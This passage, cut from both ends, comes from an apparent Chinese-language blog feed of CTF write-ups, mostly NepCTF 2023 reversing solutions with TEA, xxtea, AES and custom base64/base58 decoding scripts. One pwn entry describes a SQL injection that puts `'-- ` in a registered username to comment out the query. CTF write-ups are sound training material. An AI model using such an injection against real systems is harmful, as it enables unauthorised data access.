class="hljs-string">""</span>.join([<span class="hljs-built_in">chr</span>(base64_reverse_table[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>)])</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># table="NkQxHyXmiZTReo05ngu7dlv1BpE2SfLwM@qr6IUjb4AaP9+z3cDVOCKhJYFWs8tG"</span></span><br><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">str1 = <span class="hljs-string">"pUc@pDYASXS=2hZ4pKI+Bv3+EjkIp3=="</span></span><br><span class="line"></span><br><span class="line">string1 = <span class="hljs-string">"NkQxHyXmiZTReo05ngu7dlv1BpE2SfLwM@qr6IUjb4AaP9+z3cDVOCKhJYFWs8tG"</span></span><br><span class="line">string2 = <span class="hljs-string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">print</span> (base64.b64decode(str1.translate(<span class="hljs-built_in">str</span>.maketrans(string1,string2))))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> base58</span><br><span class="line">str2 = <span class="hljs-string">"YMQHsYFQu7kkTqu3Xmt1ruYUDLU8uaMoPpsfjqYF4TQMMKtw5KF7cpWrkWpk3"</span></span><br><span class="line">table1=<span class="hljs-string">"nY7TwcE41bzWvMQZXa8fyeprJoBdmhsu9DqVgxRPtFLKN65UH2CikG3SAj"</span></span><br><span class="line">table2=<span class="hljs-string">"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"</span></span><br><span class="line"></span><br><span class="line">res=base58.b58decode(str2.translate(<span class="hljs-built_in">str</span>.maketrans(table1,table2)))</span><br><span class="line"></span><br><span class="line">iv=<span class="hljs-string">b"NPWrpd1CEJH2QcJ3"</span></span><br><span class="line"></span><br><span class="line">f=[iv[i%<span class="hljs-built_in">len</span>(iv)]^res[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(res))]</span><br><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(f))</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> xxtea</span><br><span class="line">key = <span class="hljs-string">b"FMT2ZCEHS6pcfD2R"</span></span><br><span class="line">decrypt_data = xxtea.decrypt(<span class="hljs-built_in">bytes</span>(f), key,padding=<span class="hljs-literal">False</span>)</span><br><span class="line"><span class="hljs-built_in">print</span>(decrypt_data)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
            <tag> wmctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nepctf-2023</title>
      <link href="/2023/08/14/nepctf-2023/"/>
      <url>/2023/08/14/nepctf-2023/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>主要做了re，难度不小，可惜后面的题目没时间看了</p><span id="more"></span><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="codes"><a href="#codes" class="headerlink" title="codes"></a>codes</h2><p>main函数第三个变量就是环境变量，逐个输出就可以</p><h2 id="与AI共舞的哈夫曼"><a href="#与AI共舞的哈夫曼" class="headerlink" title="与AI共舞的哈夫曼"></a>与AI共舞的哈夫曼</h2><p>直接用gpt照着写一个</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decompress</span>(<span class="hljs-params">input_file, output_file</span>):</span></span><br><span class="line">    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> f:</span><br><span class="line">        <span class="hljs-comment"># Read frequency information</span></span><br><span class="line">        num_symbols = f.read(<span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]</span><br><span class="line">        frequencies = {}</span><br><span class="line">        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_symbols):</span><br><span class="line">            byte = f.read(<span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]</span><br><span class="line">            freq_bytes = f.read(<span class="hljs-number">4</span>)</span><br><span class="line">            freq = (freq_bytes[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">24</span>) | (freq_bytes[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">16</span>) | (freq_bytes[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">8</span>) | freq_bytes[<span class="hljs-number">3</span>]</span><br><span class="line">            frequencies[byte] = freq</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment"># Rebuild Huffman tree</span></span><br><span class="line">        root = build_huffman_tree(frequencies)</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment"># Read compressed data</span></span><br><span class="line">        compressed_data = f.read()</span><br><span class="line"></span><br><span class="line">    current_node = root</span><br><span class="line">    decompressed_data = <span class="hljs-built_in">bytearray</span>()</span><br><span class="line">    <span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> compressed_data:</span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):</span><br><span class="line">            bit_value = (bit &gt;&gt; i) &amp; <span class="hljs-number">1</span></span><br><span class="line">            <span class="hljs-keyword">if</span> bit_value == <span class="hljs-number">0</span>:</span><br><span class="line">                current_node = current_node.left</span><br><span class="line">            <span class="hljs-keyword">else</span>:</span><br><span class="line">                current_node = current_node.right</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">if</span> current_node.char <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:</span><br><span class="line">                decompressed_data.append(current_node.char)</span><br><span class="line">                current_node = root</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> f:</span><br><span class="line">        f.write(decompressed_data)</span><br></pre></td></tr></tbody></table></figure><h2 id="ConnectedFive"><a href="#ConnectedFive" class="headerlink" title="ConnectedFive"></a>ConnectedFive</h2><p>送分，下赢就行</p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="HRP-CHAT-1"><a href="#HRP-CHAT-1" class="headerlink" title="HRP-CHAT-1"></a>HRP-CHAT-1</h2><p>SQL注入，注册的用户里带<code>'-- </code>，查询的时候会把后面的语句注释掉，绕过statement查询，输出flag</p><h2 id="HRP-CHAT-3"><a href="#HRP-CHAT-3" class="headerlink" title="HRP-CHAT-3"></a>HRP-CHAT-3</h2><p>Roll出来H3，然后用技能1，相加溢出为负，得到flag</p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="九龙拉棺"><a href="#九龙拉棺" class="headerlink" title="九龙拉棺"></a>九龙拉棺</h2><p>flag分成了两段，程序里的tea解出来只有前半段。</p><p>程序中有一段数据经过RC4+base32+base58+base64之后，得到了一个dll，其中包含了另一段tea加密过程，两段解出来去重拼一起。</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// 加密函数</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">encrypt</span><span class="hljs-params">(<span class="hljs-keyword">uint32_t</span> *v, <span class="hljs-keyword">uint32_t</span> *k)</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], sum = <span class="hljs-number">0</span>, i; <span class="hljs-comment">/* set up */</span></span><br><span class="line">  <span class="hljs-keyword">uint32_t</span> delta = <span class="hljs-number">0x9e3779b9</span>;               <span class="hljs-comment">/* a key schedule constant */</span></span><br><span class="line">  <span class="hljs-keyword">uint32_t</span> k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>]; <span class="hljs-comment">/* cache key */</span></span><br><span class="line">  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {                           <span class="hljs-comment">/* basic cycle start */</span></span><br><span class="line">    sum += delta;</span><br><span class="line">    v0 += ((v1 &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + k1);</span><br><span class="line">    v1 += ((v0 &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + k3);</span><br><span class="line">  } <span class="hljs-comment">/* end cycle */</span></span><br><span class="line">  v[<span class="hljs-number">0</span>] = v0;</span><br><span class="line">  v[<span class="hljs-number">1</span>] = v1;</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">// 解密函数</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">decrypt</span><span class="hljs-params">(<span class="hljs-keyword">uint32_t</span> *v, <span class="hljs-keyword">uint32_t</span> *k)</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], sum = <span class="hljs-number">0xC6EF3720</span>, i; <span class="hljs-comment">/* set up */</span></span><br><span class="line">  <span class="hljs-keyword">uint32_t</span> delta = <span class="hljs-number">0x9e3779b9</span>; <span class="hljs-comment">/* a key schedule constant */</span></span><br><span class="line">  <span class="hljs-keyword">uint32_t</span> k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>]; <span class="hljs-comment">/* cache key */</span></span><br><span class="line">  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {                           <span class="hljs-comment">/* basic cycle start */</span></span><br><span class="line">    v1 -= ((v0 &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + k3);</span><br><span class="line">    v0 -= ((v1 &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + k1);</span><br><span class="line">    sum -= delta;</span><br><span class="line">  } <span class="hljs-comment">/* end cycle */</span></span><br><span class="line">  v[<span class="hljs-number">0</span>] = v0;</span><br><span class="line">  v[<span class="hljs-number">1</span>] = v1;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v12[<span class="hljs-number">16</span>];</span><br><span class="line">  v12[<span class="hljs-number">0</span>] = <span class="hljs-number">0x88AFD2D6</span>;</span><br><span class="line">  v12[<span class="hljs-number">1</span>] = <span class="hljs-number">0x3FBE45A7</span>;</span><br><span class="line">  v12[<span class="hljs-number">2</span>] = <span class="hljs-number">0x27AAD1B9</span>;</span><br><span class="line">  v12[<span class="hljs-number">3</span>] = <span class="hljs-number">0x8CB3E51E</span>;</span><br><span class="line">  v12[<span class="hljs-number">4</span>] = <span class="hljs-number">0x9348FFA</span>;</span><br><span class="line">  v12[<span class="hljs-number">5</span>] = <span class="hljs-number">0xE19F3C42</span>;</span><br><span class="line">  v12[<span class="hljs-number">6</span>] = <span class="hljs-number">0xFFDD0D86</span>;</span><br><span class="line">  v12[<span class="hljs-number">7</span>] = <span class="hljs-number">0xEDB97383</span>;</span><br><span class="line">  v12[<span class="hljs-number">8</span>] = <span class="hljs-number">0x12C4C0BF</span>;</span><br><span class="line">  v12[<span class="hljs-number">9</span>] = <span class="hljs-number">0x1B67BD19</span>;</span><br><span class="line">  v12[<span class="hljs-number">10</span>] = <span class="hljs-number">0xF7A514D6</span>;</span><br><span class="line">  v12[<span class="hljs-number">11</span>] = <span class="hljs-number">0x18F95254</span>;</span><br><span class="line">  v12[<span class="hljs-number">12</span>] = <span class="hljs-number">0xAB100CB0</span>;</span><br><span class="line">  v12[<span class="hljs-number">13</span>] = <span class="hljs-number">0xCBA137</span>;</span><br><span class="line">  v12[<span class="hljs-number">14</span>] = <span class="hljs-number">0x2A91712</span>;</span><br><span class="line">  v12[<span class="hljs-number">15</span>] = <span class="hljs-number">0xC58D0D9E</span>;</span><br><span class="line">  <span class="hljs-keyword">uint32_t</span> k[<span class="hljs-number">4</span>] = {<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>};</span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> c = <span class="hljs-number">0</span>; c &lt; <span class="hljs-number">8</span>; c++) {</span><br><span class="line">    <span class="hljs-built_in">decrypt</span>(&amp;v12[<span class="hljs-number">2</span> * c], k);</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++) {</span><br><span class="line">      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%c"</span>, (v12[<span class="hljs-number">2</span> * c] &gt;&gt; <span class="hljs-number">8</span> * j) &amp; <span class="hljs-number">0xff</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++) {</span><br><span class="line">      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%c"</span>, (v12[<span class="hljs-number">2</span> * c + <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">8</span> * j) &amp; <span class="hljs-number">0xff</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v16[<span class="hljs-number">16</span>];</span><br><span class="line">  v16[<span class="hljs-number">0</span>] = <span class="hljs-number">0x1DC74989</span>;</span><br><span class="line">  v16[<span class="hljs-number">1</span>] = <span class="hljs-number">0xD979AF77</span>;</span><br><span class="line">  v16[<span class="hljs-number">2</span>] = <span class="hljs-number">0x888D136D</span>;</span><br><span class="line">  v16[<span class="hljs-number">3</span>] = <span class="hljs-number">0x8E26DB7F</span>;</span><br><span class="line">  v16[<span class="hljs-number">4</span>] = <span class="hljs-number">0xC10C3CC9</span>;</span><br><span class="line">  v16[<span class="hljs-number">5</span>] = <span class="hljs-number">0xC3845D40</span>;</span><br><span class="line">  v16[<span class="hljs-number">6</span>] = <span class="hljs-number">0xC6E04459</span>;</span><br><span class="line">  v16[<span class="hljs-number">7</span>] = <span class="hljs-number">0xA2EBDF07</span>;</span><br><span class="line">  v16[<span class="hljs-number">8</span>] = <span class="hljs-number">0xD484388D</span>;</span><br><span class="line">  v16[<span class="hljs-number">9</span>] = <span class="hljs-number">0x12F956A2</span>;</span><br><span class="line">  v16[<span class="hljs-number">10</span>] = <span class="hljs-number">0x5ED7EE59</span>;</span><br><span class="line">  v16[<span class="hljs-number">11</span>] = <span class="hljs-number">0x43137F85</span>;</span><br><span class="line">  v16[<span class="hljs-number">12</span>] = <span class="hljs-number">0xEF43F9F0</span>;</span><br><span class="line">  v16[<span class="hljs-number">13</span>] = <span class="hljs-number">0xB29683AA</span>;</span><br><span class="line">  v16[<span class="hljs-number">14</span>] = <span class="hljs-number">0x8E3640B4</span>;</span><br><span class="line">  v16[<span class="hljs-number">15</span>] = <span class="hljs-number">0xC2D36177</span>;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">uint32_t</span> k2[<span class="hljs-number">4</span>] = {<span class="hljs-number">0x12</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x78</span>};</span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> c = <span class="hljs-number">0</span>; c &lt; <span class="hljs-number">8</span>; c++) {</span><br><span class="line">    <span class="hljs-built_in">decrypt</span>(&amp;v16[<span class="hljs-number">2</span> * c], k2);</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++) {</span><br><span class="line">      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%c"</span>, (v16[<span class="hljs-number">2</span> * c] &gt;&gt; <span class="hljs-number">8</span> * j) &amp; <span class="hljs-number">0xff</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++) {</span><br><span class="line">      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%c"</span>, (v16[<span class="hljs-number">2</span> * c + <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">8</span> * j) &amp; <span class="hljs-number">0xff</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">// iu41m0pv3x7kllzu8pdq6mt9n2nwjdp6kat8ent4dhn5r158iz2f0cmr0u7yxyq}</span></span><br><span class="line"><span class="hljs-comment">// NepCTF{c9cdnwdi3iu41m0pv3x7kllzu8pdq6mt9n2nwjdp6kat8ent4dhn5r158iz2f0cmr0u7yxyq}</span></span><br></pre></td></tr></tbody></table></figure><h2 id="Review"><a href="#Review" class="headerlink" title="Review"></a>Review</h2><p>很多反调试，主要操作其实就是一个xxtea+取反+AES，没有魔改</p><blockquote><p>xxtea之后还有一个生成AES密钥的操作，有几位跟结果中与后一位相同的个数有关，就48种可能，遍历一下就行，虽然最终结果就是0</p></blockquote><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">password = <span class="hljs-string">b"\x19\x28\x6E\x04\x19\x28\x6E\x04\x46\x55\xC8\x04\x46\x55\xC8\x04"</span></span><br><span class="line"></span><br><span class="line">text = <span class="hljs-string">b"\xF4\x9C\xDD\x41\x03\xDD\x5A\x13\x2E\x55\x97\x9E\xFF\xD5\x08\xD9\xF6\xD1\x09\x8C\x68\x9E\x92\xFF\x75\x0F\x80\x95\x4B\x16\xB9\xC6\x7F\x54\x2E\x20\x35\xFC\x1B\x46\x14\xAA\xDA\x5E\x4F\xBD\x59\x71"</span></span><br><span class="line">aes = AES.new(password, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">den_text = aes.decrypt(text)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(den_text), <span class="hljs-number">4</span>):</span><br><span class="line">    tmp = <span class="hljs-number">0xffffffff</span>-<span class="hljs-built_in">int</span>.from_bytes(den_text[z : z + <span class="hljs-number">4</span>], byteorder=<span class="hljs-string">"little"</span>)</span><br><span class="line">    <span class="hljs-built_in">print</span>(tmp, end=<span class="hljs-string">", "</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MX                                                                     \</span></span><br><span class="line"><span class="hljs-meta">  (((z &gt;&gt; 5 ^ y <span class="hljs-meta-string">&lt;&lt; 2) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 4)) ^                                   \</span></span><br><span class="line"><span class="hljs-meta">   ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">btea</span><span class="hljs-params">(<span class="hljs-keyword">uint32_t</span> *v, <span class="hljs-keyword">int</span> n, <span class="hljs-keyword">uint32_t</span> <span class="hljs-keyword">const</span> key[<span class="hljs-number">4</span>])</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">uint32_t</span> y, z;</span><br><span class="line">  <span class="hljs-keyword">uint32_t</span> sum;</span><br><span class="line">  <span class="hljs-keyword">unsigned</span> p, rounds, e;</span><br><span class="line">  <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">1</span>) <span class="hljs-comment">/* Coding Part */</span></span><br><span class="line">  {</span><br><span class="line">    rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;</span><br><span class="line">    sum = <span class="hljs-number">0</span>;</span><br><span class="line">    z = v[n - <span class="hljs-number">1</span>];</span><br><span class="line">    <span class="hljs-keyword">do</span> {</span><br><span class="line">      sum += DELTA;</span><br><span class="line">      e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;</span><br><span class="line">      <span class="hljs-keyword">for</span> (p = <span class="hljs-number">0</span>; p &lt; n - <span class="hljs-number">1</span>; p++) {</span><br><span class="line">        y = v[p + <span class="hljs-number">1</span>];</span><br><span class="line">        z = v[p] += MX;</span><br><span class="line">      }</span><br><span class="line">      y = v[<span class="hljs-number">0</span>];</span><br><span class="line">      z = v[n - <span class="hljs-number">1</span>] += MX;</span><br><span class="line">    } <span class="hljs-keyword">while</span> (--rounds);</span><br><span class="line">  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">-1</span>) <span class="hljs-comment">/* Decoding Part */</span></span><br><span class="line">  {</span><br><span class="line">    n = -n;</span><br><span class="line">    rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;</span><br><span class="line">    sum = rounds * DELTA;</span><br><span class="line">    y = v[<span class="hljs-number">0</span>];</span><br><span class="line">    <span class="hljs-keyword">do</span> {</span><br><span class="line">      e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;</span><br><span class="line">      <span class="hljs-keyword">for</span> (p = n - <span class="hljs-number">1</span>; p &gt; <span class="hljs-number">0</span>; p--) {</span><br><span class="line">        z = v[p - <span class="hljs-number">1</span>];</span><br><span class="line">        y = v[p] -= MX;</span><br><span class="line">      }</span><br><span class="line">      z = v[n - <span class="hljs-number">1</span>];</span><br><span class="line">      y = v[<span class="hljs-number">0</span>] -= MX;</span><br><span class="line">      sum -= DELTA;</span><br><span class="line">    } <span class="hljs-keyword">while</span> (--rounds);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">uint32_t</span> v[<span class="hljs-number">12</span>] = {<span class="hljs-number">2309579534</span>, <span class="hljs-number">3094518205</span>, <span class="hljs-number">2274467788</span>, <span class="hljs-number">4072683167</span>,</span><br><span class="line">                    <span class="hljs-number">418971191</span>,  <span class="hljs-number">2065596768</span>, <span class="hljs-number">236488259</span>,  <span class="hljs-number">3759075494</span>,</span><br><span class="line">                    <span class="hljs-number">2770389782</span>, <span class="hljs-number">2907179657</span>, <span class="hljs-number">384852496</span>,  <span class="hljs-number">1019579761</span>};</span><br><span class="line">  <span class="hljs-keyword">uint32_t</span> <span class="hljs-keyword">const</span> k[<span class="hljs-number">4</span>] = {<span class="hljs-number">0x00000019</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x0000006E</span>, <span class="hljs-number">0x00000003</span>};</span><br><span class="line">  <span class="hljs-keyword">int</span> n = <span class="hljs-number">12</span>;</span><br><span class="line"></span><br><span class="line">  btea(v, -n, k);</span><br><span class="line">  <span class="hljs-keyword">uint8_t</span> *tmp = (<span class="hljs-keyword">uint8_t</span> *)v;</span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">48</span>; i++) 